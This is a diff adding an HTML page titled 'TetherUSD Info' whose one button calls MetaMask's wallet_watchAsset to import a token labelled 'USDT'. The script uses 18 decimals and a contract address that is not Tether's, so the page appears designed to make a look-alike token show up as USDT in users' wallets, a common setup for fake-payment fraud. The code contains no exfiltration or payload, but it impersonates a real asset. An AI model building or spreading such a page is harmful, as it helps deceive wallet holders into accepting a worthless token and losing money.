@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TetherUSD Info</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0e1116;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      background: #12151c;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #222;
+      position: sticky;
+      top: 0;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 22px;
+      font-weight: 600;
+    }
+
+    nav a {
+      color: #f6851b;
+      text-decoration: none;
+      margin-left: 20px;
+      font-size: 16px;
+      transition: color 0.3s;
+    }
+
+    nav a:hover {
+      color: #ff8c28;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+    }
+
+    button {
+      background-color: #f6851b;
+      border: none;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      background-color: #ff8c28;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+      border-radius: 50%;
+    }
+
+    footer {
+      background: #12151c;
+      text-align: center;
+      padding: 10px;
+      font-size: 14px;
+      color: #aaa;
+      border-top: 1px solid #222;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>TetherUSD Info</h1>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">Token</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <main>
+    <img src="https://carrychain.github.io/tetherusd-info/logo.png" alt="Token Logo" class="logo" />
+    <button id="addTokenButton">🦊 Import Token</button>
+  </main>
+
+  <footer>
+    🚧 This website is under construction
+  </footer>
+
+  <script>
+    const tokenAddress = "0xc7f5c0BD59CE5Ad1e2530B1e5f4C76C714520D14";
+    const tokenSymbol = "USDT";
+    const tokenDecimals = 18;
+    const tokenImage = "https://carrychain.github.io/tetherusd-info/logo.png";
+
+    document.getElementById("addTokenButton").addEventListener("click", async () => {
+      if (window.ethereum) {
+        try {
+          const wasAdded = await window.ethereum.request({
+            method: "wallet_watchAsset",
+            params: {
+              type: "ERC20",
+              options: {
+                address: tokenAddress,
+                symbol: tokenSymbol,
+                decimals: tokenDecimals,
+                image: tokenImage,
+              },
+            },
+          });
+
+          if (wasAdded) {
+            alert(`${tokenSymbol} added to MetaMask!`);
+          } else {
+            alert("User canceled the request.");
+          }
+        } catch (error) {
+          console.error("Error adding token:", error);
+          alert("Something went wrong. Check console for details.");
+        }
+      } else {
+        alert("MetaMask not detected! Please install MetaMask first.");
+      }
+    });
+  </script>
+
+</body>
+</html>
